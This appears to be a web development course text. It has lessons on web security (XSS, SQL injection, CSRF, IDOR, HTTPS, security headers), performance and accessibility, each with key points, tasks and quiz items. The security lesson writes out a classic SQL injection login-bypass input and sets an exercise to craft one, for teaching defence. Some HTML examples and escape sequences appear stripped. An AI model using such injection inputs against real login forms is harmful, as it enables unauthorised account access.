The three kinds of XSS: Stored XSS is the review example; the malicious script is saved in the database and served to everyone who views it, so it is the most dangerous. Reflected XSS happens when the server takes something from the request, such as a search term in /search?q=..., and echoes it back into the page without escaping; the attacker sends victims a crafted link. DOM-based XSS happens entirely in the browser, when your own JavaScript reads something like location.hash and writes it into the page with innerHTML. In all three, the root cause is the same: untrusted text ends up being interpreted as HTML or script.

Defending against XSS: The main defence is output encoding, also called escaping. Before putting user text into HTML, convert special characters: < becomes <, > becomes >, & becomes &, and quotes become " or '. The browser then shows the attacker's script as harmless text instead of running it. Most template engines and front-end frameworks escape by default; React, for example, escapes values placed inside JSX, and you have to deliberately use an escape hatch to insert raw HTML. In plain JavaScript, use textContent instead of innerHTML for user data. A second layer is Content-Security-Policy, an HTTP response header such as Content-Security-Policy: script-src 'self', which tells the browser to run scripts only from your own origin and to block inline scripts. And mark session cookies HttpOnly so that even if a script runs, it cannot read document.cookie.

SQL injection: SQL injection happens when user input is glued directly into an SQL string. Suppose the Bazar login code builds the query like this: query = 'SELECT * FROM users WHERE email = ' + quote + email + quote + ' AND password_hash = ...'. If an attacker types the email as x' OR '1'='1' -- then the final SQL becomes SELECT * FROM users WHERE email = 'x' OR '1'='1' -- ' AND password_hash = .... The part '1'='1' is always true, and the double dash starts an SQL comment, so the password check is ignored. The database returns users, and the attacker may be logged in as the first user, often an admin. Other injected inputs can read whole tables with UNION, or even delete data.

The fix for SQL injection: Use parameterized queries, also called prepared statements. You write the SQL with placeholders, for example SELECT * FROM users WHERE email = ? (or $1, depending on the driver), and pass the value separately: db.query(sql, [email]). The database receives the SQL structure and the data on separate channels, so whatever the user typed is always treated as a value, never as SQL code. ORMs use parameters under the hood, which is one reason they are safer, but raw-query features inside ORMs can still be misused. Extra layers help: give the app's database account only the permissions it needs (no DROP TABLE rights), and validate inputs, such as checking that an id is a number.

Cross-site request forgery (CSRF): CSRF abuses the fact that browsers automatically attach cookies to requests. Suppose you are logged in to Bazar, and the session cookie is in your browser. You then visit a malicious page that contains a hidden form which auto-submits a POST to https://bazar.example/account/email, changing your email to the attacker's. Your browser sends the request with your Bazar cookie, so Bazar thinks you did it. The attacker never saw your cookie; they just made your browser do the request. Note the difference: XSS runs attacker code on your site, while CSRF makes your browser send an unwanted request from another site.

Defending against CSRF: The classic defence is a CSRF token: the server puts a random, secret value in each form (a hidden input) or gives it to the front-end, and checks it on every state-changing request. The attacker's site cannot read that token, because the same-origin policy stops it from reading your pages, so its forged request fails. The modern second layer is the SameSite cookie attribute. With SameSite=Lax, which most current browsers apply by default when a site does not set the attribute, the cookie is not sent on cross-site POST requests; SameSite=Strict blocks it on all cross-site requests. Also, never change data with GET requests, because links and images trigger GETs easily. APIs that use a token in an Authorization header instead of cookies are not exposed to classic CSRF, since the browser does not add that header automatically.

HTTPS, TLS and HSTS: Without encryption, anyone on the path, such as a person on the same public Wi-Fi in a cafe, can read or change HTTP traffic, including passwords and cookies. HTTPS is HTTP running inside TLS, which gives encryption, integrity and server authentication through certificates (the TLS handshake is covered in Computer Networks). As a web developer, your jobs are: serve every page over HTTPS, redirect HTTP to HTTPS, mark cookies Secure so they never travel over plain HTTP, and avoid mixed content, meaning an HTTPS page loading scripts or images over HTTP. Add the Strict-Transport-Security header, for example Strict-Transport-Security: max-age=31536000; includeSubDomains, so the browser remembers to use only HTTPS for your site for a year, even if a user types http://.

Broken access control and IDOR: Logging a user in is not enough; every request must also check whether this user may do this action on this object. A common bug is the insecure direct object reference, or IDOR. Bazar shows an order at /orders/1042. A curious user changes the number to /orders/1043 and sees a stranger's name, phone number and address, because the server only checked that someone was logged in, not that order 1043 belongs to them. The fix is a server-side ownership check on every request: SELECT * FROM orders WHERE id = ? AND user_id = ?. Hiding a button in the front-end is never access control, because anyone can send the request directly with a tool like curl.

Validate input on the server: Client-side validation in HTML and JavaScript is for user convenience only. An attacker can skip the browser entirely. So the server must check types, lengths, ranges and formats: quantity must be a whole number from 1 to 50, a phone number must match the expected pattern, a price must come from the database, never from the form. Prefer allow-lists, saying exactly what is valid, over block-lists, which try to guess every bad input and always miss some. Validation reduces risk but does not replace escaping and parameterized queries; you need all of them.

Secrets out of code: API keys, database passwords and the JWT signing secret must never be written in source code or pushed to GitHub. Automated bots scan public repositories for leaked keys within minutes. Store secrets in environment variables or a secrets manager, add .env files to .gitignore, and rotate (replace) any key that was ever exposed. Also, never put secrets in front-end JavaScript: everything sent to the browser can be read by the user.

Outdated dependencies and misconfiguration: A modern web app pulls in hundreds of packages from npm or similar registries. If one has a known vulnerability, your app has it too. Tools like npm audit, GitHub's Dependabot or similar scanners warn you about known problems, and you should update regularly. Misconfiguration is another big category: leaving debug mode on in production so stack traces leak internal details, default admin passwords, open cloud storage buckets, or detailed error messages that reveal SQL. Show users a generic error page and keep the details in server logs.

Clickjacking and security headers: In clickjacking, an attacker loads your page inside an invisible iframe on their site and tricks the user into clicking a button on it, for example 'Confirm order', while they think they are clicking something else. The defence is to forbid framing: send X-Frame-Options: DENY, or the newer CSP directive frame-ancestors 'none'. A few other headers are worth knowing: X-Content-Type-Options: nosniff stops the browser from guessing file types, and Referrer-Policy controls how much of the URL is sent to other sites. Many frameworks have middleware that sets a sensible group of these headers in one line.

Real-life example 1, securing Bazar's review box: A customer named Rafi submits a review. On the server, Bazar checks the length (maximum 1,000 characters), stores it with a parameterized INSERT, and when showing it, the template engine escapes it, so a review containing <script> shows up as visible text. The page also sends a Content-Security-Policy that allows scripts only from Bazar's own domain. Even if one layer had a bug, the next would likely stop the attack. This idea of several independent layers is called defence in depth.

Real-life example 2, a mobile wallet style transfer: Think of a payment page in an app like bKash or Nagad that works through the web. A transfer request must be sent over HTTPS, carry a valid session or token, include a CSRF token if cookies are used, be checked so the sender owns the source account (access control), have the amount validated on the server (positive, within limit), and be wrapped in a database transaction. On top, there is a PIN or OTP, because high-value actions deserve a second check. Each line of defence covers a different attack.

Common mistakes: Thinking HTTPS alone makes a site secure; it only protects data in transit, not against XSS or SQL injection. Escaping input when saving instead of escaping output for the right context when showing. Building SQL with string concatenation 'just for this quick admin page'. Trusting hidden form fields, such as a hidden price. Checking permissions only in the front-end. Writing custom crypto or custom sanitizers instead of using well-tested libraries. Logging passwords or tokens in plain text.

What exams ask: Define XSS and list its three types with one example each. Show how a given login query can be bypassed by SQL injection, then rewrite it with a prepared statement. Explain CSRF with a step-by-step scenario and two defences. Compare XSS and CSRF. Explain why HTTPS, HttpOnly, Secure and SameSite each matter. Name some OWASP Top 10 categories and explain broken access control with an IDOR example.

Recap: Never trust the client. Escape output and use CSP and HttpOnly against XSS. Use parameterized queries against SQL injection. Use CSRF tokens, SameSite cookies and no state changes on GET against CSRF. Serve everything over HTTPS with HSTS and Secure cookies. Check ownership and permissions on the server for every request. Validate input on the server, keep secrets out of code, update dependencies, and set security headers. Security is not one feature added at the end; it is a habit in every line you write.
key_points: Never trust anything from the client: forms, URLs, headers, cookies and JSON can all be forged.
The OWASP Top 10 lists the most critical web risks; broken access control and injection have stayed near the top.
XSS (stored, reflected, DOM) runs attacker script in your page; defend with output escaping, textContent, CSP and HttpOnly cookies.
SQL injection glues input into SQL; defend with parameterized queries and least-privilege database accounts.
CSRF makes a victim's browser send a forged request with its cookies; defend with CSRF tokens, SameSite cookies and no state changes on GET.
HTTPS protects data in transit; add HSTS, Secure cookies and avoid mixed content.
Check ownership on the server for every request to stop IDOR; hiding buttons is not access control.
Defence in depth: validation, escaping, headers, secret management and updated dependencies work together.
lessons.tip: For every input box you build, ask two questions: where does this text end up (HTML, SQL, shell, URL), and what makes it safe there? That one habit prevents most of the OWASP Top 10.
lessons.task: Write this vulnerable query on paper: 'SELECT * FROM products WHERE name = ' + quote + userInput + quote. Find an input that returns every product, then rewrite the query as a parameterized one and explain in two lines why your attack no longer works. Bonus: open DevTools on any site you use, check the response headers for Strict-Transport-Security and Content-Security-Policy.

quiz.q: A malicious script is saved in a product review and runs for every visitor who opens that page. What is this?
quiz.explain: The script is stored in the database and served to all viewers, which is stored XSS, the most dangerous kind.

quiz.q: What is the standard fix for SQL injection?
quiz.explain: Placeholders send the SQL structure and the data separately, so input is never treated as SQL code.

quiz.q: Why does a CSRF attack work at all?
options: The browser automatically attaches cookies to requests to that site
quiz.explain: The forged request from another site carries the victim's cookies automatically, so the server thinks the victim sent it.

quiz.q: A user changes /orders/1042 to /orders/1043 and sees a stranger's order. Which risk is this?
quiz.explain: The server did not check that the order belongs to the logged-in user; that is an insecure direct object reference, a kind of broken access control.

quiz.q: Which header tells the browser to use only HTTPS for a site for a set time?
quiz.explain: HSTS (Strict-Transport-Security with max-age) makes the browser refuse plain HTTP for that site.

lessons.title: Web Performance: Rendering, Caching, CDNs, Compression, Lazy Loading and Core Web Vitals
lessons.content:
Imagine two tea stalls side by side near Dhaka University. At the first one, the tea maker starts boiling water only after you order, then goes to buy milk. At the second, water is already hot, cups are ready, and the most popular order is half prepared. Both make the same tea, but the second stall gets all the customers. Websites are the same. Two pages can show identical content, yet one appears in one second and the other in eight, and users leave the slow one. Web performance is the craft of making the second kind of stall: deciding what to prepare early, what to carry less of, and what to deliver from closer by.

Why speed matters: A slow page loses people. Many users, especially on mobile data with a weak signal in a village or a crowded bus, give up if nothing appears within a few seconds. Speed also affects money and reach: a faster checkout means more completed orders on Bazar, and Google uses page experience signals, including Core Web Vitals, as part of its ranking. Performance is also fairness: a page that is 5 MB costs real money to someone on a small mobile data pack. So we measure and improve two things: how many bytes we send, and how quickly the browser can turn them into something visible and usable.

What the browser does with a page: To fix slowness you need to know the steps, called the critical rendering path. First the browser downloads the HTML and parses it into the DOM tree. When it meets a link to a CSS file, it downloads and parses that into the CSSOM, the CSS object model. It combines DOM and CSSOM into the render tree, which holds only the visible elements with their computed styles. Then comes layout, also called reflow, where it calculates the exact position and size of every box. Then paint, where pixels are filled in, and compositing, where layers are put together on screen. Anything that delays these steps delays the first thing the user sees.

Render-blocking resources: CSS is render-blocking: the browser will not paint the page until it has the CSS, because otherwise the page would flash unstyled. A normal script tag is parser-blocking: when the parser meets <script src='app.js'>, it stops building the DOM, downloads and runs the script, then continues. That is why old advice said to put scripts at the end of body. Today we use the defer attribute, which downloads the script in parallel and runs it after the HTML is parsed, in order, or async, which runs it as soon as it arrives, in any order, good for independent scripts like analytics. For CSS, keep it small, load only what the page needs, and for very important pages inline the small critical CSS needed for the first screen.

Counting the cost, a worked example: Suppose the Bazar home page has 1 HTML file of 30 KB, 1 CSS file of 120 KB, 3 JavaScript files of 300 KB each, and 20 product images of 200 KB each. Total = 30 + 120 + 900 + 4,000 = 5,050 KB, about 5 MB. On a connection delivering 1 MB per second, that is roughly 5 seconds of pure transfer, ignoring round trips. Images are about 80 percent of the bytes, so they are the first target. If we shrink each image to 50 KB and compress JS to 300 KB total, the page becomes 30 + 120 + 300 + 1,000 = 1,450 KB, under 1.5 seconds of transfer. Measuring first tells you where the real weight is.

HTTP caching from the developer's side: The fastest request is the one never made. You control browser caching with the Cache-Control response header (the network-side mechanics of conditional GET are in Computer Networks). Cache-Control: max-age=31536000, immutable says 'keep this for a year and do not even ask again'. Cache-Control: no-cache means 'you may store it, but check with me before using it'. Cache-Control: no-store means 'never store it', used for private data like a bank statement. Private means only the user's browser may cache it, not shared caches; public allows shared caches and CDNs too.

Revalidation with ETag: When a cached copy needs checking, the server can give each version of a file a tag, for example ETag: '5f3a9c'. Next time, the browser sends If-None-Match: '5f3a9c'. If the file has not changed, the server replies 304 Not Modified with no body, saving the download. If it changed, the server sends 200 with the new file and a new ETag. The older pair Last-Modified and If-Modified-Since works the same way using dates.

Cache busting with fingerprinted filenames: A common professional pattern is to put a hash of the file content into its name, such as app.3f9a2c.js. Then you can cache it for a year with immutable. When you change the code, the build tool produces a new name, like app.81bd07.js, and the HTML points to the new name, so users get the new file at once. The HTML itself is usually given no-cache, so the browser always checks for the latest page that points to the latest files.

CDNs: A content delivery network keeps copies of your static files, such as images, CSS and JS, on servers in many cities. A user in Chattogram fetching Bazar's images may be served from a nearby edge server instead of an origin server in Singapore or Europe, cutting the round-trip time a lot. CDNs also absorb traffic spikes, for example during an Eid sale, and many provide compression, HTTPS and attack filtering. You usually just point a domain like cdn.bazar.example at the CDN, and set good Cache-Control headers so the CDN knows how long to keep each file.

Minification and bundling: Minification removes what humans need but machines do not: spaces, newlines, comments, and long local variable names. A function written as function calculateTotal(items) { let total = 0; ... } might become function c(t){let e=0;...}. It behaves the same but is smaller. Bundlers such as webpack, Vite, esbuild or Rollup combine many small modules into fewer files, remove unused code (called tree shaking), and can split code so each page only loads what it needs, which is called code splitting. With HTTP/2 many small files are cheaper than before, so the goal is sensible chunks, not one giant file.

Compression: Text files compress very well because they repeat words like function, div and class. The server compresses responses with gzip or Brotli, and the browser announces what it supports with Accept-Encoding: gzip, br. The response says Content-Encoding: br. Brotli usually produces smaller files than gzip for text. Compression often shrinks HTML, CSS and JS by around 60 to 80 percent. Images like JPEG and PNG are already compressed, so gzipping them gives little benefit; they need their own optimization.

Images: Choose the right format: JPEG for photos, PNG for graphics needing sharp edges or transparency, SVG for logos and icons (they are tiny text files that scale perfectly), and the newer WebP and AVIF formats, which usually give smaller files than JPEG at similar quality and are supported by modern browsers. Serve the right size: there is no point sending a 4000 pixel wide camera photo to a phone that shows it 400 pixels wide. Use srcset so the browser picks a suitable size (responsive images were covered in the responsive design lesson). Always set width and height attributes so the browser reserves space before the image loads.

Lazy loading: Why download 20 product images when the user sees only 4 on the first screen? The native attribute loading='lazy' on an img or iframe tells the browser to delay loading until the element is near the viewport. Bazar's product list then loads the first few images at once and the rest as the user scrolls. Do not lazy-load the main image at the top of the page, because that delays what the user sees first. JavaScript can be lazy-loaded too, using dynamic import() to fetch the code for, say, a review editor only when the user clicks 'Write a review'.

Core Web Vitals: Google defines three user-centred metrics. LCP, Largest Contentful Paint, measures loading: when the largest visible image or text block finishes rendering; good is 2.5 seconds or less. INP, Interaction to Next Paint, measures responsiveness: how long the page takes to visually respond after user interactions like taps and key presses; good is 200 milliseconds or less. INP replaced the older FID metric in 2024. CLS, Cumulative Layout Shift, measures visual stability: how much things jump around while loading; good is 0.1 or less. Everyone has tapped the wrong button because an ad suddenly pushed the page down; that is layout shift.

Fixing each vital: For LCP, make the hero image small and fast, preload it, do not lazy-load it, and cut render-blocking CSS and JS. For INP, avoid long JavaScript tasks on the main thread; split heavy work into smaller pieces, ship less JavaScript, and move heavy calculation to a Web Worker. For CLS, give images and videos width and height, reserve space for ads and banners, and avoid inserting content above existing content after load. Web fonts can also cause shifts or invisible text; font-display: swap shows a fallback font immediately.

Measuring with Lighthouse and DevTools: Chrome DevTools includes Lighthouse, which runs a test and gives scores for performance, accessibility, best practices and SEO with concrete suggestions. The Network tab lets you throttle to a slow connection such as 'Slow 4G' and see every file's size and timing; the Performance panel shows what the main thread is doing. Lab tests run on one machine; field data comes from real users on real phones. Google's PageSpeed Insights shows both for public sites. Always measure before and after a change.

Server-side speed: The front end is only half the story. A slow database query can make the server take 2 seconds before sending the first byte. Time to First Byte measures this delay. Common fixes are adding database indexes, avoiding the N+1 query problem, caching expensive results in memory or Redis, and keeping the server geographically close to users. Rendering pages on the server or generating them in advance also helps the first view.

Real-life example 1, Bazar before an Eid sale: Lighthouse shows LCP of 6 seconds on a slow 4G profile. The hero banner is a 2.5 MB PNG. The team converts it to a 150 KB WebP, preloads it, moves product images below the fold to loading='lazy', adds defer to scripts, turns on Brotli, puts static files on a CDN with year-long caching and fingerprinted names, and adds width and height to images. LCP drops to about 2 seconds and CLS falls close to 0. Nothing changed in the product; only how it was delivered.

Real-life example 2, a news site on result day: When exam results are published, a news portal gets a sudden flood of visitors. Serving the same article page to many people from a CDN cache, even with a short max-age like 60 seconds, means the origin server answers once per minute per edge instead of thousands of times. This is how sites survive traffic spikes without buying huge servers.

Common mistakes: Optimizing without measuring. Lazy-loading the top hero image. Caching HTML for a year so users never see updates. Forgetting width and height on images, which causes layout shift. Shipping a huge JavaScript framework for a mostly static page. Thinking a fast office Wi-Fi test reflects real users on budget phones.

What exams ask: Explain the critical rendering path. Difference between defer and async. Explain Cache-Control directives and ETag-based revalidation with 304. What a CDN is and why it helps. Define minification, bundling and compression. Name and explain LCP, INP and CLS with their good thresholds. Suggest five ways to speed up a given slow page.

Recap: Measure first. Send fewer bytes with compression, minification, better image formats and right sizes. Avoid needless requests with caching and fingerprinted files. Shorten the distance with CDNs. Load less up front with defer, code splitting and lazy loading. Keep the main thread free. Watch LCP, INP and CLS. A fast site respects the user's time and data pack.
key_points: Critical rendering path: HTML to DOM, CSS to CSSOM, render tree, layout, paint; CSS blocks rendering, plain scripts block parsing.
Use defer (ordered, after parsing) or async (as soon as ready) for scripts.
Cache-Control controls caching: max-age, immutable, no-cache (revalidate), no-store; ETag with If-None-Match gives 304 Not Modified.
Fingerprinted filenames like app.3f9a2c.js allow year-long caching with instant updates.
CDNs serve static files from nearby edge servers and absorb traffic spikes.
Minify, bundle with code splitting, compress text with gzip or Brotli, and use WebP or AVIF at the right size.
loading='lazy' delays off-screen images; never lazy-load the main hero image.
Core Web Vitals: LCP 2.5 s or less, INP 200 ms or less, CLS 0.1 or less; measure with Lighthouse and real-user data.
lessons.tip: Before optimizing anything, open the Network tab, sort by size, and look at the top five files. In most real sites, one or two oversized images or scripts are most of the problem.
lessons.task: Open any shopping or news site in Chrome, press F12, open Lighthouse and run a mobile performance report. Write down the LCP, INP or TBT, and CLS values and the top three suggestions. Then in the Network tab, find the largest file and check whether it has a Cache-Control header and a Content-Encoding.

quiz.q: Which script attribute downloads in parallel and runs scripts in order after the HTML is parsed?
quiz.explain: defer keeps document order and waits until parsing finishes; async runs each script as soon as it arrives.

quiz.q: A browser sends If-None-Match with an ETag and the file has not changed. What does the server reply?
quiz.explain: 304 tells the browser its cached copy is still valid, so no body is sent.

quiz.q: Which Core Web Vital measures how much content jumps around while the page loads?
quiz.explain: Cumulative Layout Shift measures visual stability; good is 0.1 or less.

quiz.q: Why can app.3f9a2c.js safely be cached for a year?
options: Its name changes whenever its content changes
quiz.explain: The hash in the name is a fingerprint of the content; new code gets a new name, so old cached copies are never wrongly reused.

quiz.q: Which image should NOT get loading='lazy'?
options: Product images far down the list
The large hero banner at the top of the page
quiz.explain: The hero image is usually the LCP element; lazy-loading it delays what the user sees first.

lessons.title: Web Accessibility: WCAG, Semantic HTML, Keyboard, Contrast and ARIA
lessons.content:
Imagine a new shopping mall in Dhaka with beautiful glass doors, but the only entrance is a long staircase. A man in a wheelchair, a grandmother with bad knees, and a mother pushing a pram all stand at the bottom, unable to enter. Nothing is wrong with them; the building was designed without them in mind. Add a ramp, and suddenly everyone can enter, including the delivery man with a heavy trolley. Web accessibility is building ramps into websites: making sure people with different abilities can perceive, understand, navigate and use your pages. Who benefits: Accessibility, often shortened to a11y (a, then 11 letters, then y), helps people who are blind and use screen readers, people with low vision who zoom to 200 or 400 percent, people with colour blindness, deaf and hard-of-hearing users who need captions, people who cannot use a mouse and rely on a keyboard or switch device, and people with cognitive or learning differences who need clear, predictable pages. The WHO estimates that about 1.3 billion people, roughly one in six, live with a significant disability. Accessibility also helps everyone in temporary or situational limits: a broken arm, bright sunlight on a phone screen, a noisy bus where you cannot play sound, or an elderly parent with shaky hands. Why developers must care: First, it is simply right: the web should work for everyone. Second, many countries have laws or government rules requiring accessible websites, especially for public services, and lawsuits over inaccessible sites happen. Third, accessible sites are usually better for all users and for search engines, because the same semantic structure that a screen reader uses is what Google's crawler reads. Fourth, fixing accessibility at design time is cheap; fixing it after launch is expensive. WCAG: The Web Content Accessibility Guidelines are published by the W3C's Web Accessibility Initiative. Versions are 2.0 (2008), 2.1 (2018) and 2.2 (2023). Each guideline has testable success criteria at three conformance levels: A (the minimum), AA (the usual target in laws and company policies) and AAA (the highest, not required for whole sites because some content cannot meet it). When a contract says 'WCAG 2.1 AA', it means every page must meet all level A and AA criteria of that version. The four POUR principles: WCAG is organised around four principles. Perceivable: users must be able to perceive the content, so give text alternatives for images, captions for video and enough contrast. Operable: users must be able to operate the interface, so everything must work with a keyboard, users need enough time, and nothing should flash in a way that can trigger seizures. Understandable: text and behaviour must be understandable, so use clear language, predictable navigation and helpful error messages. Robust: content must work with many browsers and assistive technologies, so use valid, standard HTML that tools can interpret. Alt text for images: A screen reader cannot see a picture; it reads the alt attribute. For Bazar's product image, write , describing what matters, not 'image' or 'rice.jpg'. If the image is a link, the alt should describe where the link goes. If an image is purely decorative, like a background swirl, use an empty alt, alt='', so the screen reader skips it. Leaving alt out entirely is worst: many screen readers then read the file name, such as 'IMG underscore 4 0 3 2 dot jpg'. Complex images like charts need a nearby text summary of the data. Headings and page structure: Screen reader users often jump through a page by headings, like reading the table of contents. So use one h1 for the page title and then h2, h3 in a logical order without skipping levels for looks. Use landmark elements such as header, nav, main and footer, which screen readers announce and let users jump to. A 'Skip to main content' link at the very top, visible when focused, lets keyboard users avoid tabbing through 30 menu links on every page. Also set the page language, or lang='bn', so the screen reader uses the right pronunciation. Form labels and errors: Every input needs a programmatic label. connects them, so the screen reader says 'Phone number, edit text' and clicking the label focuses the field, which also helps people with shaky hands. Placeholder text is not a label: it disappears when typing and often has low contrast. When validation fails, show an error in text near the field, explain how to fix it ('Phone must be 11 digits starting with 01'), and do not rely on red colour alone. Linking the message with aria-describedby lets the screen reader read it with the field. Colour and contrast: Text must stand out from its background. WCAG level AA requires a contrast ratio of at least 4.5:1 for normal text and 3:1 for large text (about 18 point, or 14 point bold). Black on white is 21:1, the maximum; light grey #999999 on white is about 2.8:1, which fails for normal text. Contrast checkers in DevTools and online tools calculate the ratio for you. Also, never use colour as the only way to convey information. A form that marks wrong fields only in red is invisible to someone with red-green colour blindness; add an icon or the word 'Error'. Keyboard access: Many people navigate with only a keyboard: Tab moves to the next interactive element, Shift+Tab goes back, Enter activates links and buttons, Space toggles checkboxes and presses buttons, and arrow keys move within menus and radio groups. Native elements like a, button, input and select are keyboard-accessible automatically. The classic mistake is a 'button' made from a div with a click handler:
Add
. It cannot be reached by Tab, cannot be pressed with Enter, and the screen reader does not call it a button. The fix is simply . Visible focus: When you tab through a page, the focused element should have a clear outline so users know where they are.
